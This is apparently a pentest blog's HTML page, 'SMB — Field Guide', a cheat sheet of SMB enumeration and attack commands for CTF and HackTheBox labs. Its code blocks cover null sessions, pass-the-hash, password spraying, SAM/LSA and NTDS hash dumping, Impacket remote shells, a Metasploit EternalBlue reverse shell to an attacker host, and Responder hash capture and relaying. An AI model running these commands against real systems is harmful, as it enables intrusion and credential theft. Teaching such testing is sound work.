@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>SMB — Field Guide — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-tools">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-tools">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">SMB — Field Guide</h1>
+    <div class="post-meta">
+      <time>2026-06-02</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">1 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/tools/" class="cat-badge cat-badge-link cat-tools">Tools</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">smb</span>
+          
+            <span class="tag">enumeration</span>
+          
+            <span class="tag">windows</span>
+          
+            <span class="tag">tools</span>
+          
+            <span class="tag">active-directory</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">Null sessions, share enumeration, pass-the-hash, and a full CTF workflow covering smbclient, smbmap, enum4linux, CrackMapExec, Impacket, EternalBlue, and Responder.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">01</span>
+            <span class="heading-text">What is SMB</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>SMB (<em>Server Message Block</em>) is the Windows file-sharing protocol. It runs on <strong>port 445</strong> (direct) and port 139 (over NetBIOS). It handles file shares, printers, named pipes, and Windows authentication.</p>
+<p>For attackers and pentesters, SMB is one of the most valuable services on a network — it leaks usernames, hashes, shares, OS versions, and domain info, and has a long history of critical vulnerabilities (EternalBlue, PrintNightmare, PetitPotam).</p>
+<p><strong>Main tools:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Tool</th><th>Purpose</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`smbclient`</td><td>Browse/transfer files, like an FTP client for SMB</td>
+                </tr>
+              
+                <tr>
+                  <td>`smbmap`</td><td>Map share permissions across a network</td>
+                </tr>
+              
+                <tr>
+                  <td>`enum4linux` / `enum4linux-ng`</td><td>Full SMB/LDAP enumeration</td>
+                </tr>
+              
+                <tr>
+                  <td>`crackmapexec` (CME) / `netexec`</td><td>Swiss-army knife — auth, spray, exec</td>
+                </tr>
+              
+                <tr>
+                  <td>`impacket`</td><td>Python SMB toolkit — psexec, secretsdump, smbexec</td>
+                </tr>
+              
+                <tr>
+                  <td>`rpcclient`</td><td>Raw RPC queries — users, groups, policy</td>
+                </tr>
+              
+                <tr>
+                  <td>`nmap`</td><td>NSE scripts for SMB vuln detection</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">02</span>
+            <span class="heading-text">Initial Recon</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Detect and fingerprint SMB</span>
+          </div>
+          <pre><code class="language-bash"># Check if SMB is open
+nmap -p 139,445 10.10.10.5
+
+# OS + SMB version detection
+nmap -p 445 --script smb-os-discovery 10.10.10.5
+
+# Full SMB enumeration with NSE
+nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode 10.10.10.5
+
+# Vulnerability scan
+nmap -p 445 --script smb-vuln-* 10.10.10.5
+
+# Check for EternalBlue (MS17-010)
+nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">03</span>
+            <span class="heading-text">smbclient</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>smbclient</code> is the built-in Kali/Linux SMB client — think of it as FTP for Windows shares. It connects to individual shares and gives you an interactive prompt.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">smbclient usage</span>
+          </div>
+          <pre><code class="language-bash"># List available shares (null session — no credentials)
+smbclient -L //10.10.10.5 -N
+
+# List shares with credentials
+smbclient -L //10.10.10.5 -U &#39;user%password&#39;
+
+# Connect to a specific share
+smbclient //10.10.10.5/Share -N
+smbclient //10.10.10.5/C$ -U &#39;administrator%Password123&#39;
+
+# Pass-the-hash (no plaintext password needed)
+smbclient //10.10.10.5/C$ -U &#39;administrator&#39; --pw-nt-hash &lt;NTLM_HASH&gt;
+
+# Specify domain
+smbclient //10.10.10.5/Share -U &#39;DOMAIN\user%password&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">smbclient interactive commands</span>
+          </div>
+          <pre><code class="language-bash">smb: \&gt; ls                    # list files
+smb: \&gt; ls -la                # list including hidden files
+smb: \&gt; cd Documents          # change directory
+smb: \&gt; get passwords.txt     # download a file
+smb: \&gt; put shell.exe         # upload a file
+smb: \&gt; mget *                # download everything
+smb: \&gt; prompt off            # disable per-file confirmation
+smb: \&gt; recurse on            # enable recursive listing/download
+smb: \&gt; mget *                # download all files recursively
+smb: \&gt; mkdir loot            # create a directory
+smb: \&gt; del old.txt           # delete a file
+smb: \&gt; exit</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">One-liner download (no interactive prompt)</span>
+          </div>
+          <pre><code class="language-bash"># Download a single file non-interactively
+smbclient //10.10.10.5/Share -N -c &#39;get flag.txt&#39;
+
+# Download entire share recursively
+smbclient //10.10.10.5/Share -N -c &#39;prompt off; recurse on; mget *&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">04</span>
+            <span class="heading-text">smbmap</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>smbmap</code> shows you <strong>all shares and their permissions</strong> at a glance — read, write, or no access. Much faster than connecting to each share manually.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">smbmap enumeration</span>
+          </div>
+          <pre><code class="language-bash"># Null session — list shares and permissions
+smbmap -H 10.10.10.5
+
+# With credentials
+smbmap -H 10.10.10.5 -u &#39;user&#39; -p &#39;password&#39;
+
+# With NTLM hash
+smbmap -H 10.10.10.5 -u &#39;administrator&#39; -p &#39;&lt;NTLM_HASH&gt;&#39; --no-pass
+
+# List contents of a specific share
+smbmap -H 10.10.10.5 -u &#39;user&#39; -p &#39;password&#39; -r Share
+
+# Recursive listing
+smbmap -H 10.10.10.5 -u &#39;user&#39; -p &#39;password&#39; -R Share
+
+# Download a file
+smbmap -H 10.10.10.5 -u &#39;user&#39; -p &#39;password&#39; --download &#39;Share/path/file.txt&#39;
+
+# Scan entire subnet
+smbmap -H 10.10.10.0/24 -u &#39;user&#39; -p &#39;password&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">05</span>
+            <span class="heading-text">enum4linux / enum4linux-ng</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>enum4linux</code> pulls everything SMB and RPC have to offer in one shot: users, groups, shares, password policy, OS info, and domain details.</p>
+<p><code>enum4linux-ng</code> is the modern rewrite — faster, cleaner output, JSON export.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">enum4linux enumeration</span>
+          </div>
+          <pre><code class="language-bash"># Full enumeration (null session)
+enum4linux -a 10.10.10.5
+
+# With credentials
+enum4linux -a -u &#39;user&#39; -p &#39;password&#39; 10.10.10.5
+
+# Specific flags
+enum4linux -U 10.10.10.5   # users only
+enum4linux -S 10.10.10.5   # shares only
+enum4linux -P 10.10.10.5   # password policy
+enum4linux -G 10.10.10.5   # groups
+enum4linux -o 10.10.10.5   # OS info
+
+# enum4linux-ng (recommended)
+enum4linux-ng -A 10.10.10.5
+enum4linux-ng -A -u &#39;user&#39; -p &#39;password&#39; 10.10.10.5
+enum4linux-ng -A 10.10.10.5 -oJ results   # save as JSON</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">06</span>
+            <span class="heading-text">rpcclient</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>rpcclient</code> sends raw RPC commands. Useful when you need specific info that higher-level tools don't expose — or when everything else is blocked.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">rpcclient commands</span>
+          </div>
+          <pre><code class="language-bash"># Connect (null session)
+rpcclient -U &#39;&#39; -N 10.10.10.5
+
+# Connect with credentials
+rpcclient -U &#39;user%password&#39; 10.10.10.5
+
+# Inside rpcclient:
+rpcclient $&gt; srvinfo          # server info + OS
+rpcclient $&gt; enumdomusers     # list domain users
+rpcclient $&gt; enumdomgroups    # list groups
+rpcclient $&gt; querydominfo     # domain info + password policy
+rpcclient $&gt; getdompwinfo     # password complexity policy
+rpcclient $&gt; enumprinters     # list printers
+rpcclient $&gt; netshareenumall  # list all shares
+
+# One-liner (non-interactive)
+rpcclient -U &#39;&#39; -N 10.10.10.5 -c &#39;enumdomusers&#39; 2&gt;/dev/null
+
+# Extract just usernames
+rpcclient -U &#39;&#39; -N 10.10.10.5 -c &#39;enumdomusers&#39; 2&gt;/dev/null \
+  | grep -oP &#39;\[.*?\]&#39; | grep -v &#39;0x&#39; | tr -d &#39;[]&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">07</span>
+            <span class="heading-text">CrackMapExec / NetExec</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>CME (now <code>netexec</code>) is the fastest tool for credential testing, password spraying, and lateral movement at scale. Install: <code>sudo apt install crackmapexec</code> or <code>pipx install netexec</code>.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">CrackMapExec / netexec examples</span>
+          </div>
+          <pre><code class="language-bash"># Test a single credential pair
+crackmapexec smb 10.10.10.5 -u &#39;user&#39; -p &#39;password&#39;
+
+# Test across a subnet
+crackmapexec smb 10.10.10.0/24 -u &#39;administrator&#39; -p &#39;Password123&#39;
+
+# Password spray (one password, many users)
+crackmapexec smb 10.10.10.5 -u users.txt -p &#39;Password123&#39; --continue-on-success
+
+# Pass-the-hash
+crackmapexec smb 10.10.10.5 -u &#39;administrator&#39; -H &#39;&lt;NTLM_HASH&gt;&#39;
+
+# List shares
+crackmapexec smb 10.10.10.5 -u &#39;user&#39; -p &#39;password&#39; --shares
+
+# Execute a command (requires admin)
+crackmapexec smb 10.10.10.5 -u &#39;administrator&#39; -p &#39;password&#39; -x &#39;whoami&#39;
+
+# Dump SAM hashes (local admin required)
+crackmapexec smb 10.10.10.5 -u &#39;administrator&#39; -p &#39;password&#39; --sam
+
+# Dump LSA secrets
+crackmapexec smb 10.10.10.5 -u &#39;administrator&#39; -p &#39;password&#39; --lsa
+
+# Check for null sessions across subnet
+crackmapexec smb 10.10.10.0/24 -u &#39;&#39; -p &#39;&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">08</span>
+            <span class="heading-text">Impacket</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Impacket is a Python library with standalone scripts for SMB exploitation, hash dumping, and remote execution. Lives in <code>/usr/share/doc/python3-impacket/examples/</code> or installed as <code>impacket-*</code> commands on Kali.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Key impacket scripts</span>
+          </div>
+          <pre><code class="language-bash"># psexec — remote shell via SMB (requires admin + writable share)
+impacket-psexec administrator:Password123@10.10.10.5
+impacket-psexec -hashes :&lt;NTLM_HASH&gt; administrator@10.10.10.5
+
+# smbexec — stealthier remote exec (uses service, no file drop)
+impacket-smbexec administrator:Password123@10.10.10.5
+
+# wmiexec — exec via WMI (even stealthier, no service install)
+impacket-wmiexec administrator:Password123@10.10.10.5
+
+# secretsdump — dump SAM, LSA, NTDS.dit hashes remotely
+impacket-secretsdump administrator:Password123@10.10.10.5
+impacket-secretsdump -hashes :&lt;NTLM_HASH&gt; administrator@10.10.10.5
+
+# smbclient.py — impacket&#39;s own smb client
+impacket-smbclient administrator:Password123@10.10.10.5
+
+# lookupsid — brute-force SID to enumerate users without creds
+impacket-lookupsid anonymous@10.10.10.5 | grep SidTypeUser</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">09</span>
+            <span class="heading-text">Real-World Use Cases</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Internal audit — find exposed shares and sensitive files:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Network-wide share audit</span>
+          </div>
+          <pre><code class="language-bash"># Map all SMB shares and permissions across the subnet
+smbmap -H 10.0.0.0/24 -u &#39;auditor&#39; -p &#39;password&#39;
+
+# Find SYSVOL/NETLOGON for GPP passwords (classic finding)
+smbclient //10.0.0.5/SYSVOL -U &#39;user%password&#39;
+smb: \&gt; recurse on
+smb: \&gt; prompt off
+smb: \&gt; mget *   # look for Groups.xml, Services.xml, etc.
+
+# Search shares for sensitive filenames
+crackmapexec smb 10.0.0.5 -u &#39;user&#39; -p &#39;password&#39; -M spider_plus</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Mount an SMB share on Linux:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Mount SMB share</span>
+          </div>
+          <pre><code class="language-bash">sudo mkdir /mnt/share
+sudo mount -t cifs //10.0.0.5/Share /mnt/share \
+  -o username=user,password=password,vers=3.0
+
+# Or add to /etc/fstab for persistent mount:
+# //10.0.0.5/Share /mnt/share cifs credentials=/etc/samba/creds,vers=3.0 0 0</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">10</span>
+            <span class="heading-text">CTF &amp; HackTheBox Workflow</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>On CTF/HTB boxes, SMB usually leads to credentials, flags, or a foothold. The typical flow: null session → share list → read files → find credentials → reuse creds → lateral movement or shell.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">HTB SMB recon workflow</span>
+          </div>
+          <pre><code class="language-bash">export IP=10.10.10.5
+
+# 1. Check SMB version + OS
+nmap -p 445 --script smb-os-discovery $IP
+
+# 2. Try null session share listing
+smbclient -L //$IP -N
+smbmap -H $IP
+
+# 3. Full enum with enum4linux-ng
+enum4linux-ng -A $IP
+
+# 4. Browse readable shares
+smbclient //$IP/ShareName -N
+
+# 5. Dump everything from a readable share
+smbclient //$IP/ShareName -N -c &#39;prompt off; recurse on; mget *&#39;
+
+# 6. If you have credentials — check for admin access
+crackmapexec smb $IP -u &#39;user&#39; -p &#39;password&#39;
+# Pwn3d! = local admin → can exec commands
+
+# 7. Vuln check
+nmap -p 445 --script smb-vuln-ms17-010 $IP</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">EternalBlue (MS17-010) — Metasploit</span>
+          </div>
+          <pre><code class="language-bash"># Check vulnerability first
+nmap -p 445 --script smb-vuln-ms17-010 $IP
+
+# Metasploit
+msfconsole -q
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.5
+set LHOST 10.10.14.5
+set PAYLOAD windows/x64/shell_reverse_tcp
+run</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Grab hashes via Responder (MITM)</span>
+          </div>
+          <pre><code class="language-bash"># Start Responder on your network interface
+sudo responder -I tun0 -v
+
+# Trigger a UNC path from the victim (file upload, URL, etc.)
+# Responder captures NTLMv2 hashes
+
+# Crack the captured hash offline
+hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
+john captured.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Or relay the hash with ntlmrelayx (if SMB signing is disabled)
+impacket-ntlmrelayx -tf targets.txt -smb2support</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-warning">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
+              
+              <span>Quick reference</span>
+            </div>
+          
+          <div class="note-body"><p><strong>Always try null sessions first</strong> — <code>smbclient -L //IP -N</code> and <code>smbmap -H IP</code>.<br>
+<strong><code>crackmapexec</code></strong> is the fastest way to test creds across a subnet.<br>
+<strong>Pwn3d!</strong> in CME output = local admin rights = can dump hashes and exec commands.<br>
+<strong><code>impacket-secretsdump</code></strong> dumps everything remotely without dropping a binary.<br>
+<strong>Check SYSVOL</strong> for GPP passwords (<code>cpassword</code> in <code>.xml</code> files) — still common.<br>
+<strong>SMB signing disabled?</strong> That's a relay attack waiting to happen — check with CME: <code>--gen-relay-list</code>.</p></div>
+        </div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/crackmapexec-netexec" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">CrackMapExec &amp; NetExec — The Complete Reference</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Everything about CrackMapExec and its maintained fork NetExec: SMB enumeration, authentication testing, Pass-the-Hash, command execution, credential dumping, BloodHound integration, LDAP, WinRM, MSSQL, SSH modules, password spraying methodology, and OPSEC considerations for every technique.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/smtp-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">SMTP — Field Guide</h2>
+          <div class="post-card-meta"><time>2026-06-03</time></div>
+          <p class="post-card-summary">Banner grabbing, user enumeration via VRFY/RCPT, open relay testing with swaks, and a CTF workflow for turning an open relay into code execution.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/ldap-guide" class="post-card post-card-related card-cat-tools">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-tools">Tools</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">LDAP – Directory Enumeration &amp; Active Directory Recon</h2>
+          <div class="post-card-meta"><time>2026-06-03</time></div>
+          <p class="post-card-summary">LDAP is the backbone of Active Directory. Learn to query it anonymously and with credentials to extract users, groups, computers, and policies — essential for both AD administration and offensive enumeration.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
